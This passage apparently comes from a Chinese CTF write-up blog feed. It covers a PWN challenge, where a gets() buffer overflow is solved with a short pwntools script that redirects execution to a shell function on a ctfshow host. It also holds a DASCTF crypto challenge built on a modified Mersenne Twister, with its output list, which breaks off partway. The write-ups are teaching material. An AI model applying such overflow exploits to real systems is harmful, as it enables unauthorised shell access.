class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(byte_8048668);<br>  dsb(&amp;argc);<br>  <span class="hljs-built_in">puts</span>(asc_8048694);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入dsb。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dsb</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里一个溢出漏洞。函数列表中有一个shell_here函数。所以我们直接用shell_here的地址盖返回地址就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br><span class="hljs-keyword">import</span> pwn<br><br>r = pwn.remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="hljs-number">28175</span>)<br>r.send(<span class="hljs-string">b&quot;\xf6\x84\x04\x08&quot;</span>*<span class="hljs-number">6</span>)<br><br>r.interactive()<br><br><span class="hljs-comment"># ctfshow&#123;19d0be7b-3f2d-48e6-a8f6-186af1f41177&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Crypto</tag>
      
      <tag>PWN</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022DASCTF MAY 出题人挑战赛</title>
    <link href="/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>2022DASCTF MAY 出题人挑战赛中 Yusa的密码学课堂——一见如故 的题解。</p><span id="more"></span><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="yusa的密码学课堂一见如故"><a class="markdownIt-Anchor" href="#yusa的密码学课堂一见如故"></a> Yusa的密码学课堂——一见如故</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myrand</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,seed</span>):<br>self.index = <span class="hljs-number">0</span><br>self.isInit = <span class="hljs-number">1</span><br>self.MT = [seed] + [<span class="hljs-number">0</span>] * <span class="hljs-number">623</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">624</span>):<br>t = <span class="hljs-number">1314433253</span> * (self.MT[i-<span class="hljs-number">1</span>] ^ (self.MT[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) + <span class="hljs-number">1</span><br>self.MT[i] = t &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>y = (self.MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (self.MT[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>self.MT[i] = self.MT[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>self.MT[i] ^= <span class="hljs-number">2567483520</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(<span class="hljs-built_in">str</span>(out))<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(r.rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>文件里面是输出的rand数。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">3417500333</span>, <span class="hljs-number">4091726338</span>, <span class="hljs-number">652603332</span>, <span class="hljs-number">4187304543</span>, <span class="hljs-number">4293795290</span>, <span class="hljs-number">1622245003</span>, <span class="hljs-number">3383443782</span>, <span class="hljs-number">2420250331</span>, <span class="hljs-number">322010852</span>, <span class="hljs-number">1604005753</span>, <span class="hljs-number">3137930218</span>, <span class="hljs-number">1074571824</span>, <span class="hljs-number">1566336258</span>, <span class="hljs-number">2754341076</span>, <span class="hljs-number">1059426660</span>, <span class="hljs-number">2461569360</span>, <span class="hljs-number">613134153</span>, <span class="hljs-number">860561774</span>, <span class="hljs-number">3003069274</span>, <span class="hljs-number">553387944</span>, <span class="hljs-number">1949778231</span>, <span class="hljs-number">249886857</span>, <span class="hljs-number">2322866121</span>, <span class="hljs-number">3685855175</span>, <span class="hljs-number">1977923546</span>, <span class="hljs-number">1887238269</span>, <span class="hljs-number">253812990</span>, <span class="hljs-number">2188417674</span>, <span class="hljs-number">2718707711</span>, <span class="hljs-number">1599975569</span>, <span class="hljs-number">3254935456</span>, <span class="hljs-number">3199641169</span>, <span class="hljs-number">362166522</span>, <span class="hljs-number">1378687155</span>, <span class="hljs-number">912036995</span>, <span class="hljs-number">3174049018</span>, <span class="hljs-number">780042016</span>, <span class="hljs-number">970421905</span>, <span class="hljs-number">3468971406</span>, <span class="hljs-number">801660807</span>, <span class="hljs-number">833926127</span>, <span class="hljs-number">473587885</span>, <span class="hljs-number">158979812</span>, <span class="hljs-number">405306558</span>, <span class="hljs-number">1363084996</span>, <span class="hljs-number">2023076543</span>, <span class="hljs-number">2069797730</span>, <span class="hljs-number">718155249</span>, <span class="hljs-number">1641186127</span>, <span class="hljs-number">3616747747</span>, <span class="hljs-number">1575693921</span>, <span class="hljs-number">3856591855</span>, <span class="hljs-number">223881884</span>, <span class="hljs-number">3002184567</span>, <span class="hljs-number">1666647440</span>, <span class="hljs-number">617661934</span>, <span class="hljs-number">2673101022</span>, <span class="hljs-number">885332395</span>, <span class="hljs-number">3391329168</span>, <span class="hljs-number">1640225363</span>, <span class="hljs-number">2565685644</span>, <span class="hljs-number">3892963352</span>, <span class="hljs-number">3034627488</span>, <span class="hljs-number">2415435183</span>, <span class="hljs-number">3648712566</span>, <span class="hljs-number">2140877952</span>, <span class="hljs-number">1303506086</span>, <span class="hljs-number">2455662362</span>, <span class="hljs-number">1720382700</span>, <span class="hljs-number">3970268445</span>, <span class="hljs-number">2579167586</span>, <span class="hljs-number">4117229324</span>, <span class="hljs-number">846645263</span>, <span class="hljs-number">3252991293</span>, <span class="hljs-number">79067029</span>, <span class="hljs-number">2756800392</span>, <span class="hljs-number">2212447526</span>, <span class="hljs-number">2203329967</span>, <span class="hljs-number">1270408703</span>, <span class="hljs-number">740176928</span>, <span class="hljs-number">3176125705</span>, <span class="hljs-number">166800854</span>, <span class="hljs-number">3327343902</span>, <span class="hljs-number">2079714725</span>, <span class="hljs-number">3702269956</span>, <span class="hljs-number">3659849279</span>, <span class="hljs-number">3658666909</span>, <span class="hljs-number">797535816</span>, <span class="hljs-number">600857570</span>, <span class="hljs-number">553836307</span>, <span class="hljs-number">2394740468</span>, <span class="hljs-number">1178393549</span>, <span class="hljs-number">2183765310</span>, <span class="hljs-number">4014432190</span>, <span class="hljs-number">652246726</span>, <span class="hljs-number">3693235932</span>, <span class="hljs-number">4046942361</span>, <span class="hljs-number">4105444828</span>, <span class="hljs-number">145386213</span>, <span class="hljs-number">1198390220</span>, <span class="hljs-number">3023119098</span>, <span class="hljs-number">663559283</span>, <span class="hljs-number">225958361</span>, <span class="hljs-number">3893000878</span>, <span class="hljs-number">1615631644</span>, <span class="hljs-number">1941951859</span>, <span class="hljs-number">471085675</span>, <span class="hljs-number">2164362049</span>, <span class="hljs-number">4274234562</span>, <span class="hljs-number">4127314557</span>, <span class="hljs-number">1833529303</span>, <span class="hljs-number">17668093</span>, <span class="hljs-number">3208743142</span>, <span class="hljs-number">3210135945</span>, <span class="hljs-number">1772990736</span>, <span class="hljs-number">3290157875</span>, <span class="hljs-number">3006334453</span>, <span class="hljs-number">3831748800</span>, <span class="hljs-number">1120411838</span>, <span class="hljs-number">690279329</span>, <span class="hljs-number">2436940844</span>, <span class="hljs-number">1440602808</span>, <span class="hljs-number">1552272917</span>, <span class="hljs-number">1321728089</span>, <span class="hljs-number">524486126</span>, <span class="hljs-number">3696307959</span>, <span class="hljs-number">1189129368</span>, <span class="hljs-number">28736041</span>, <span class="hljs-number">3143264315</span>, <span class="hljs-number">3050323849</span>, <span class="hljs-number">1458456612</span>, <span class="hljs-number">389869312</span>, <span class="hljs-number">2360130428</span>, <span class="hljs-number">854837117</span>, <span class="hljs-number">1270423403</span>, <span class="hljs-number">3471650414</span>, <span class="hljs-number">243573262</span>, <span class="hljs-number">3449929772</span>, <span class="hljs-number">2436299611</span>, <span class="hljs-number">420972940</span>, <span class="hljs-number">923873821</span>, <span class="hljs-number">3499748829</span>, <span class="hljs-number">2470333529</span>, <span class="hljs-number">3901870125</span>, <span class="hljs-number">3589884387</span>, <span class="hljs-number">3339475693</span>, <span class="hljs-number">1526947412</span>, <span class="hljs-number">1747516667</span>, <span class="hljs-number">2971536797</span>, <span class="hljs-number">273910310</span>, <span class="hljs-number">2185887289</span>, <span class="hljs-number">2723697010</span>, <span class="hljs-number">1973585459</span>, <span class="hljs-number">1166325256</span>, <span class="hljs-number">1360822059</span>, <span class="hljs-number">416514510</span>, <span class="hljs-number">4038763765</span>, <span class="hljs-number">1816380840</span>, <span class="hljs-number">940152644</span>, <span class="hljs-number">3918708431</span>, <span class="hljs-number">3410593321</span>, <span class="hljs-number">3358844522</span>, <span class="hljs-number">3678637784</span>, <span class="hljs-number">2412834780</span>, <span class="hljs-number">3052967117</span>, <span class="hljs-number">3672611162</span>, <span class="hljs-number">570069042</span>, <span class="hljs-number">95771608</span>, <span class="hljs-number">1210821251</span>, <span class="hljs-number">2163778365</span>, <span class="hljs-number">2739972546</span>, <span class="hljs-number">3094346015</span>, <span class="hljs-number">749719666</span>, <span class="hljs-number">1697477587</span>, <span class="hljs-number">986142486</span>, <span class="hljs-number">2591897292</span>, <span class="hljs-number">1234948693</span>, <span class="hljs-number">3659791160</span>, <span class="hljs-number">3990257960</span>, <span class="hljs-number">501199958</span>, <span class="hljs-number">3029961497</span>, <span class="hljs-number">578415668</span>, <span class="hljs-number">124517322</span>, <span class="hljs-number">1985205894</span>, <span class="hljs-number">3777347400</span>, <span class="hljs-number">1149995545</span>, <span class="hljs-number">290699775</span>, <span class="hljs-number">3399696193</span>, <span class="hljs-number">1062094395</span>, <span class="hljs-number">2896523484</span>, <span class="hljs-number">1562688856</span>, <span class="hljs-number">992098141</span>, <span class="hljs-number">3941170280</span>, <span class="hljs-number">262596967</span>, <span class="hljs-number">2585751001</span>, <span class="hljs-number">3682611205</span>, <span class="hljs-number">530523926</span>, <span class="hljs-number">1202322766</span>, <span class="hljs-number">3777439514</span>, <span class="hljs-number">3051700271</span>, <span class="hljs-number">261632458</span>, <span class="hljs-number">2736123960</span>, <span class="hljs-number">2786338595</span>, <span class="hljs-number">86310784</span>, <span class="hljs-number">2760191516</span>, <span class="hljs-number">1344514731</span>, <span class="hljs-number">350767781</span>, <span class="hljs-number">2858876127</span>, <span class="hljs-number">519088864</span>, <span class="hljs-number">3193340756</span>, <span class="hljs-number">3563489312</span>, <span class="hljs-number">3239917298</span>, <span class="hljs-number">161418824</span>, <span class="hljs-number">470724403</span>, <span class="hljs-number">3310407387</span>, <span class="hljs-number">1743713887</span>, <span class="hljs-number">3064036770</span>, <span class="hljs-number">1175434157</span>, <span class="hljs-number">3029464330</span>, <span class="hljs-number">116086349</span>, <span class="hljs-number">1652489862</span>, <span class="hljs-number">1176236897</span>, <span class="hljs-number">4139800383</span>, <span class="hljs-number">3758499033</span>, <span class="hljs-number">2961626313</span>, <span class="hljs-number">3064683859</span>, <span class="hljs-number">958478146</span>, <span class="hljs-number">596650527</span>, <span class="hljs-number">1000277312</span>, <span class="hljs-number">4102368994</span>, <span class="hljs-number">1480011430</span>, <span class="hljs-number">4001401502</span>, <span class="hljs-number">4004287177</span>, <span class="hljs-number">3202905309</span>, <span class="hljs-number">1754655955</span>, <span class="hljs-number">2064262245</span>, <span class="hljs-number">1840530874</span>, <span class="hljs-number">2284428117</span>, <span class="hljs-number">2281854453</span>, <span class="hljs-number">1023839768</span>, <span class="hljs-number">2166517711</span>, <span class="hljs-number">2709857675</span>, <span class="hljs-number">2005014414</span>, <span class="hljs-number">4161461001</span>, <span class="hljs-number">2932436148</span>, <span class="hljs-number">2411599350</span>, <span class="hljs-number">4267437788</span>, <span class="hljs-number">2132764972</span>, <span class="hljs-number">150665266</span>, <span class="hljs-number">286170947</span>, <span class="hljs-number">2249288787</span>, <span class="hljs-number">3953585886</span>, <span class="hljs-number">1231725143</span>, <span class="hljs-number">2479045931</span>, <span class="hljs-number">2377059462</span>, <span class="hljs-number">281316188</span>, <span class="hljs-number">379113422</span>, <span class="hljs-number">920019004</span>, <span class="hljs-number">163289886</span>, <span class="hljs-number">2210874762</span>, <span class="hljs-number">1578529538</span>, <span class="hljs-number">309521495</span>, <span class="hljs-number">3737017316</span>, <span class="hljs-number">88919917</span>, <span class="hljs-number">559742618</span>, <span class="hljs-number">978230553</span>, <span class="hljs-number">2154491496</span>, <span class="hljs-number">994913727</span>, <span class="hljs-number">498894258</span>, <span class="hljs-number">1355546448</span>, <span class="hljs-number">4023836881</span>, <span class="hljs-number">3014313787</span>, <span class="hljs-number">164044564</span>, <span class="hljs-number">2408825840</span>, <span class="hljs-number">2029992558</span>, <span class="hljs-number">3707778216</span>, <span class="hljs-number">86206872</span>, <span class="hljs-number">3576935874</span>, <span class="hljs-number">185356787</span>, <span class="hljs-number">1774175910</span>, <span class="hljs-number">3145237900</span>, <span class="hljs-number">3497547609</span>, <span class="hljs-number">841914878</span>, <span class="hljs-number">3425254534</span>, <span class="hljs-number">4264030778</span>, <span class="hljs-number">2348022032</span>, <span class="hljs-number">178331591</span>, <span class="hljs-number">943923822</span>, <span class="hljs-number">3384367749</span>, <span class="hljs-number">2806712599</span>, <span class="hljs-number">1178535099</span>, <span class="hljs-number">1251085540</span>, <span class="hljs-number">2410015803</span>, <span class="hljs-number">1480595408</span>, <span class="hljs-number">2732607876</span>, <span class="hljs-number">1579706357</span>, <span class="hljs-number">870791724</span>, <span class="hljs-number">2320512780</span>, <span class="hljs-number">2149666862</span>, <span class="hljs-number">3797999384</span>, <span class="hljs-number">3905363134</span>, <span class="hljs-number">3388169321</span>, <span class="hljs-number">851973359</span>, <span class="hljs-number">1418716205</span>, <span class="hljs-number">207581030</span>, <span class="hljs-number">1740441523</span>, <span class="hljs-number">1173839013</span>, <span class="hljs-number">4280610104</span>, <span class="hljs-number">1769134281</span>, <span class="hljs-number">1758916333</span>, <span class="hljs-number">4061069248</span>, <span class="hljs-number">2147554262</span>, <span class="hljs-number">2749007447</span>, <span class="hljs-number">909878569</span>, <span class="hljs-number">2054562584</span>, <span class="hljs-number">1515003000</span>, <span class="hljs-number">560286390</span>, <span class="hljs-number">2482663802</span>, <span class="hljs-number">2690882951</span>, <span class="hljs-number">3298162668</span>, <span class="hljs-number">2561737261</span>, <span class="hljs-number">167825221</span>, <span class="hljs-number">507375343</span>, <span class="hljs-number">2179952491</span>, <span class="hljs-number">795452860</span>, <span class="hljs-number">2877704207</span>, <span class="hljs-number">3243106071</span>, <span class="hljs-number">1633372043</span>, <span class="hljs-number">2152178033</span>, <span class="hljs-number">2993246714</span>, <span class="hljs-number">4176238981</span>, <span class="hljs-number">3828458887</span>, <span class="hljs-number">695369535</span>, <span class="hljs-number">2514762808</span>, <span class="hljs-number">2251430819</span>, <span class="hljs-number">2743651063</span>, <span class="hljs-number">783239046</span>, <span class="hljs-number">4036497041</span>, <span class="hljs-number">2175424426</span>, <span class="hljs-number">765021321</span>, <span class="hljs-number">897227922</span>, <span class="hljs-number">3192938155</span>, <span class="hljs-number">4173350810</span>, <span class="hljs-number">2290496185</span>, <span class="hljs-number">4215986056</span>, <span class="hljs-number">2448481441</span>, <span class="hljs-number">3114984799</span>, <span class="hljs-number">2920066349</span>, <span class="hljs-number">722868808</span>, <span class="hljs-number">594363801</span>, <span class="hljs-number">4012575088</span>, <span class="hljs-number">454547939</span>, <span class="hljs-number">3331771662</span>, <span class="hljs-number">1267229957</span>, <span class="hljs-number">3170277692</span>, <span class="hljs-number">2446344734</span>, <span class="hljs-number">3730529788</span>, <span class="hljs-number">2621611481</span>, <span class="hljs-number">2972284304</span>, <span class="hljs-number">2580290241</span>, <span class="hljs-number">486727007</span>, <span class="hljs-number">2727955445</span>, <span class="hljs-number">1457071884</span>, <span class="hljs-number">1053028185</span>, <span class="hljs-number">462301682</span>, <span class="hljs-number">3907840756</span>, <span class="hljs-number">1832398102</span>, <span class="hljs-number">3144685297</span>, <span class="hljs-number">3403964915</span>, <span class="hljs-number">4263570498</span>, <span class="hljs-number">792776003</span>, <span class="hljs-number">306771255</span>, <span class="hljs-number">1633688240</span>, <span class="hljs-number">2159479271</span>, <span class="hljs-number">942060576</span>, <span class="hljs-number">1311531808</span>, <span class="hljs-number">3145754189</span>, <span class="hljs-number">4142271069</span>, <span class="hljs-number">2844524541</span>, <span class="hljs-number">4082439147</span>, <span class="hljs-number">2847276716</span>, <span class="hljs-number">1374436698</span>, <span class="hljs-number">2601522390</span>, <span class="hljs-number">529644524</span>, <span class="hljs-number">206090172</span>, <span class="hljs-number">3015114937</span>, <span class="hljs-number">4137169373</span>, <span class="hljs-number">2600331537</span>, <span class="hljs-number">344659140</span>, <span class="hljs-number">155319271</span>, <span class="hljs-number">1724932164</span>, <span class="hljs-number">3187877676</span>, <span class="hljs-number">4020168431</span>, <span class="hljs-number">711431575</span>, <span class="hljs-number">4123955169</span>, <span class="hljs-number">2539963709</span>, <span class="hljs-number">2764832709</span>, <span class="hljs-number">3897838285</span>, <span class="hljs-number">2521203644</span>, <span class="hljs-number">2059212822</span>, <span class="hljs-number">1129046005</span>, <span class="hljs-number">3277260664</span>, <span class="hljs-number">2739869189</span>, <span class="hljs-number">1955591901</span>, <span class="hljs-number">2661672178</span>, <span class="hljs-number">2926355273</span>, <span class="hljs-number">28176978</span>, <span class="hljs-number">706409211</span>, <span class="hljs-number">1432061304</span>, <span class="hljs-number">26517996</span>, <span class="hljs-number">3180196905</span>, <span class="hljs-number">2178525849</span>, <span class="hljs-number">607854674</span>, <span class="hljs-number">3953350517</span>, <span class="hljs-number">3532394548</span>, <span class="hljs-number">4175940932</span>, <span class="hljs-number">626671309</span>, <span class="hljs-number">1273934270</span>, <span class="hljs-number">3481828801</span>, <span class="hljs-number">22643989</span>, <span class="hljs-number">2104739013</span>, <span class="hljs-number">4183577772</span>, <span class="hljs-number">3932721637</span>, <span class="hljs-number">3075788222</span>, <span class="hljs-number">2814353001</span>, <span class="hljs-number">4120869721</span>, <span class="hljs-number">2045506903</span>, <span class="hljs-number">603494333</span>, <span class="hljs-number">335162960</span>, <span class="hljs-number">2069261279</span>, <span class="hljs-number">2278614835</span>, <span class="hljs-number">210140447</span>, <span class="hljs-number">2012566692</span>, <span class="hljs-number">2345710126</span>, <span class="hljs-number">70390387</span>, <span class="hljs-number">457247932</span>, <span class="hljs-number">2764651800</span>, <span class="hljs-number">652766919</span>, <span class="hljs-number">555253440</span>, <span class="hljs-number">864036913</span>, <span class="hljs-number">1720142260</span>, <span class="hljs-number">453262569</span>, <span class="hljs-number">1113437101</span>, <span class="hljs-number">2576419688</span>, <span class="hljs-number">144008475</span>, <span class="hljs-number">1786881829</span>, <span class="hljs-number">2455128823</span>, <span class="hljs-number">2884922345</span>, <span class="hljs-number">4251332234</span>, <span class="hljs-number">58949785</span>, <span class="hljs-number">4206002785</span>, <span class="hljs-number">3374754553</span>, <span class="hljs-number">2976162198</span>, <span class="hljs-number">546450687</span>, <span class="hljs-number">1268444784</span>, <span class="hljs-number">4132330381</span>, <span class="hljs-number">3404894280</span>, <span class="hljs-number">2421962142</span>, <span class="hljs-number">212361299</span>, <span class="hljs-number">2526283704</span>, <span class="hljs-number">1656118437</span>, <span class="hljs-number">1249336298</span>, <span class="hljs-number">305885855</span>, <span class="hljs-number">1090758249</span>, <span class="hljs-number">3752057640</span>, <span class="hljs-number">3508190692</span>, <span class="hljs-number">3637428</span>, <span class="hljs-number">105102422</span>, <span class="hljs-number">2247418237</span>, <span class="hljs-number">1873609555</span>, <span class="hljs-number">1206760240</span>, <span class="hljs-number">3761689119</span>, <span class="hljs-number">3151616638</span>, <span class="hljs-number">1711308858</span>, <span class="hljs-number">1261541178</span>, <span class="hljs-number">1843103377</span>, <span class="hljs-number">3158893523</span>, <span class="hljs-number">1226253110</span>, <span class="hljs-number">3337577909</span>, <span class="hljs-number">126612372</span>, <span class="hljs-number">2239219657</span>, <span class="hljs-number">1415387229</span>, <span class="hljs-number">3657507305</span>, <span class="hljs-number">3330696118</span>, <span class="hljs-number">2304219467</span>, <span class="hljs-number">3782535397</span>, <span class="hljs-number">2523926865</span>, <span class="hljs-number">173770442</span>, <span class="hljs-number">469421316</span>, <span class="hljs-number">4068724979</span>, <span class="hljs-number">567442650</span>, <span class="hljs-number">1996215573</span>, <span class="hljs-number">2071307093</span>, <span class="hljs-number">778899724</span>, <span class="hljs-number">3534102235</span>, <span class="hljs-number">1001138889</span>, <span class="hljs-number">2821812427</span>, <span class="hljs-number">591691317</span>, <span class="hljs-number">1265763678</span>, <span class="hljs-number">2241915660</span>, <span class="hljs-number">3220601768</span>, <span class="hljs-number">653090205</span>, <span class="hljs-number">2367897867</span>, <span class="hljs-number">1393909319</span>, <span class="hljs-number">2691817329</span>, <span class="hljs-number">3098049768</span>, <span class="hljs-number">117121403</span>, <span class="hljs-number">1255294678</span>, <span class="hljs-number">2272844919</span>, <span class="hljs-number">788255921</span>, <span class="hljs-number">2333869622</span>, <span class="hljs-number">4052660679</span>, <span class="hljs-number">2407095869</span>, <span class="hljs-number">2636108242</span>, <span class="hljs-number">2204717619</span>, <span class="hljs-number">1672726444</span>, <span class="hljs-number">2250826426</span>, <span class="hljs-number">258706466</span>, <span class="hljs-number">2295454699</span>, <span class="hljs-number">337308034</span>, <span class="hljs-number">3703973770</span>, <span class="hljs-number">3133498524</span>, <span class="hljs-number">22718827</span>, <span class="hljs-number">3096937679</span>, <span class="hljs-number">2039003308</span>, <span class="hljs-number">1519854757</span>, <span class="hljs-number">568184976</span>, <span class="hljs-number">1986854118</span>, <span class="hljs-number">2888207511</span>, <span class="hljs-number">822307630</span>, <span class="hljs-number">3829301724</span>, <span class="hljs-number">3198527490</span>, <span class="hljs-number">3073739663</span>, <span class="hljs-number">3043580445</span>, <span class="hljs-number">3458239370</span>, <span class="hljs-number">802145890</span>, <span class="hljs-number">376901460</span>, <span class="hljs-number">1251103099</span>, <span class="hljs-number">1143003993</span>, <span class="hljs-number">1280321148</span>, <span class="hljs-number">661386076</span>, <span class="hljs-number">3708710489</span>, <span class="hljs-number">2237151715</span>, <span class="hljs-number">3928104641</span>, <span class="hljs-number">2975550516</span>, <span class="hljs-number">1087492088</span>, <span class="hljs-number">1504028830</span>, <span class="hljs-number">61927086</span>, <span class="hljs-number">3858242888</span>, <span class="hljs-number">1916136658</span>, <span class="hljs-number">2328550074</span>, <span class="hljs-number">3032032377</span>, <span class="hljs-number">2193802260</span>, <span class="hljs-number">3311627503</span>, <span class="hljs-number">3196945045</span>, <span class="hljs-number">3396801792</span>, <span class="hljs-number">806210594</span>, <span class="hljs-number">2449941623</span>, <span class="hljs-number">2514744466</span>, <span class="hljs-number">3922130206</span>, <span class="hljs-number">3245757763</span>, <span class="hljs-number">3128328446</span>, <span class="hljs-number">2335833206</span>, <span class="hljs-number">3205660364</span>, <span class="hljs-number">3527402441</span>, <span class="hljs-number">2174241644</span>, <span class="hljs-number">1262568556</span>, <span class="hljs-number">2360103007</span>, <span class="hljs-number">2490217737</span>, <span class="hljs-number">1485100950</span>, <span class="hljs-number">3407260</span>, <span class="hljs-number">3005226942</span>, <span class="hljs-number">1355314866</span>, <span class="hljs-number">3154763465</span>, <span class="hljs-number">619881867</span>, <span class="hljs-number">2409963438</span>, <span class="hljs-number">2422269402</span>, <span class="hljs-number">205756019</span>, <span class="hljs-number">3300644241</span>, <span class="hljs-number">1157501775</span>, <span class="hljs-number">1229058028</span>, <span class="hljs-number">161050869</span>, <span class="hljs-number">969496287</span>, <span class="hljs-number">3385825249</span>, <span class="hljs-number">2557284067</span>, <span class="hljs-number">4236642714</span>, <span class="hljs-number">169094727</span>, <span class="hljs-number">2698326774</span>, <span class="hljs-number">1863176242</span>, <span class="hljs-number">3532885426</span>, <span class="hljs-number">3046403588</span>, <span class="hljs-number">3869207867</span>, <span class="hljs-number">496104150</span>, <span class="hljs-number">353604631</span>, <span class="hljs-number">1054882225</span>, <span class="hljs-number">152711981</span>, <span class="hljs-number">1362131890</span>, <span class="hljs-number">76912113</span>, <span class="hljs-number">3052177189</span>, <span class="hljs-number">3932252092</span>, <span class="hljs-number">3834713905</span>, <span class="hljs-number">2338378436</span>, <span class="hljs-number">44417325</span>, <span class="hljs-number">117723195</span>, <span class="hljs-number">1089433566</span>, <span class="hljs-number">4166617161</span>, <span class="hljs-number">2848021308</span>, <span class="hljs-number">2229619096</span>, <span 